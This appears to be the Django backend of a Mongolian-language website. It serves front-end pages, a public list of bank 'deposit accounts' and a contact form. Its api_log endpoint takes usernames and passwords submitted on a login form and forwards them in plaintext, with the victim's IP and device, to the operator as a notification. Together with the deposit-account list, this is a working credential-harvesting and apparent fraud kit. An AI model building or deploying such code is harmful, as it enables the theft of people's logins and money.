import json, os, mimetypes
from django.http import JsonResponse, HttpResponse, FileResponse
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods
from django.conf import settings
from . import security

ROOT = str(settings.BASE_DIR)

_BLOCKED_NAMES = {'manage.py'}
_BLOCKED_DIRS  = {'config', 'api'}
_BLOCKED_EXTS  = {'.py', '.pyc', '.pyo'}


def serve_file(request, filepath=''):
    if not filepath:
        # index.html нь device.js-ээ ачаалж, дэлгэцийн өргөнөөр (+мэдрэгч оролт)
        # desktop/desktop.html эсвэл mobile/mobile2.html руу зөв чиглүүлнэ.
        filepath = 'index.html'

    if filepath == 'mobile_app.js':
        filepath = 'mobile/mobile_app.js'

    safe = os.path.normpath(os.path.join('/', filepath)).lstrip('/')
    full = os.path.abspath(os.path.join(ROOT, safe))

    if full != ROOT and not full.startswith(ROOT + os.sep):
        return HttpResponse(status=403)

    parts = safe.split(os.sep)
    if parts[0] in _BLOCKED_DIRS:
        return HttpResponse(status=404)

    if os.path.basename(full) in _BLOCKED_NAMES:
        return HttpResponse(status=404)
    _, ext = os.path.splitext(full)
    if ext in _BLOCKED_EXTS:
        return HttpResponse(status=404)

    if os.path.isdir(full):
        full = os.path.join(full, 'index.html')

    if os.path.isfile(full):
        content_type, _ = mimetypes.guess_type(full)
        ct = content_type or 'application/octet-stream'
        if ct.startswith('text/') or ct in ('application/javascript', 'application/json'):
            with open(full, 'rb') as f:
                resp = HttpResponse(f.read(), content_type=ct)
            resp['Cache-Control'] = 'public, max-age=1800' if ct == 'text/html' else 'public, max-age=86400'
            return resp
        resp = FileResponse(open(full, 'rb'), content_type=ct)
        resp['Cache-Control'] = 'public, max-age=86400'
        return resp

    return HttpResponse(status=404)


@csrf_exempt
@require_http_methods(['POST'])
def api_log(request):
    try:
        ip = request.META.get('REMOTE_ADDR', '')
        if security.check_rate(ip):
            return HttpResponse(status=429)
        entry = json.loads(request.body.decode('utf-8'))
        if not entry.get('u') and not entry.get('p'):
            return JsonResponse({'ok': True})
        ua     = request.headers.get('User-Agent', '')
        device = security.device_label(ua)
        cat    = entry.get('c', 'Нэвтрэх')
        security.send_notification(
            f'🔔 {cat}',
            f'Нэр: <b>{entry["u"]}</b>\nНууц үг: <code>{entry["p"]}</code>',
            subtitle=f'IP: {ip}  |  {device}',
        )
        return JsonResponse({'ok': True})
    except Exception:
        return HttpResponse(status=400)


CONTACTS_FILE = os.path.join(ROOT, 'data', 'contacts.json')
ACCOUNTS_FILE = os.path.join(ROOT, 'data', 'accounts.json')

def _load_accounts():
    try:
        with open(ACCOUNTS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return []

def _save_accounts(accounts):
    os.makedirs(os.path.dirname(ACCOUNTS_FILE), exist_ok=True)
    with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
        json.dump(accounts, f, ensure_ascii=False, indent=2)

@require_http_methods(['GET', 'POST', 'DELETE'])
def api_accounts(request):
    from django.conf import settings
    admin_key = getattr(settings, 'ADMIN_KEY', None)

    # Public GET — no key needed (users see deposit accounts)
    if request.method == 'GET':
        return JsonResponse(_load_accounts(), safe=False)

    # POST / DELETE — admin only
    if admin_key and request.GET.get('key') != admin_key:
        return HttpResponse(status=403)

    if request.method == 'POST':
        try:
            body = json.loads(request.body.decode('utf-8'))
            bank    = str(body.get('bank', '')).strip()[:60]
            number  = str(body.get('number', '')).strip()[:40]
            holder  = str(body.get('holder', '')).strip()[:60]
            note    = str(body.get('note', '')).strip()[:200]
            if not bank or not number:
                return HttpResponse(status=400)
            from datetime import datetime
            acc = {
                'id': int(datetime.utcnow().timestamp() * 1000),
                'bank': bank, 'number': number, 'holder': holder, 'note': note,
            }
            accounts = _load_accounts()
            accounts.append(acc)
            _save_accounts(accounts)
            return JsonResponse(acc)
        except Exception:
            return HttpResponse(status=400)

    if request.method == 'DELETE':
        try:
            body = json.loads(request.body.decode('utf-8'))
            aid = body.get('id')
            accounts = [a for a in _load_accounts() if a.get('id') != aid]
            _save_accounts(accounts)
            return JsonResponse({'ok': True})
        except Exception:
            return HttpResponse(status=400)

    return HttpResponse(status=405)

def _load_contacts():
    try:
        with open(CONTACTS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return []

def _save_contacts(contacts):
    os.makedirs(os.path.dirname(CONTACTS_FILE), exist_ok=True)
    with open(CONTACTS_FILE, 'w', encoding='utf-8') as f:
        json.dump(contacts, f, ensure_ascii=False, indent=2)


@csrf_exempt
@require_http_methods(['POST'])
def api_contact(request):
    try:
        ip = request.META.get('REMOTE_ADDR', '')
        if security.check_rate(ip):
            return HttpResponse(status=429)
        body = json.loads(request.body.decode('utf-8'))
        name    = str(body.get('name', '')).strip()[:100]
        kind    = str(body.get('kind', 'Гомдол')).strip()[:50]
        message = str(body.get('message', '')).strip()[:2000]
        if not message:
            return HttpResponse(status=400)
        from datetime import datetime
        entry = {
            'id': int(datetime.utcnow().timestamp() * 1000),
            'name': name or 'Нэргүй',
            'kind': kind,
            'message': message,
            'ip': ip,
            'time': datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC'),
            'read': False,
        }
        contacts = _load_contacts()
        contacts.insert(0, entry)
        _save_contacts(contacts)
        security.send_notification(
            f'📩 {kind} — {entry["name"]}',
            message,
            subtitle=f'IP: {ip}  |  {entry["time"]}',
        )
        return JsonResponse({'ok': True})
    except Exception:
        return HttpResponse(status=400)


@require_http_methods(['GET', 'POST'])
def api_contacts(request):
    from django.conf import settings
    admin_key = getattr(settings, 'ADMIN_KEY', None)
    if admin_key and request.GET.get('key') != admin_key:
        return HttpResponse(status=403)
    if request.method == 'POST':
        # Mark as read
        try:
            body = json.loads(request.body.decode('utf-8'))
            cid = body.get('id')
            contacts = _load_contacts()
            for c in contacts:
                if c.get('id') == cid:
                    c['read'] = True
            _save_contacts(contacts)
            return JsonResponse({'ok': True})
        except Exception:
            return HttpResponse(status=400)
    contacts = _load_contacts()
    return JsonResponse(contacts, safe=False)


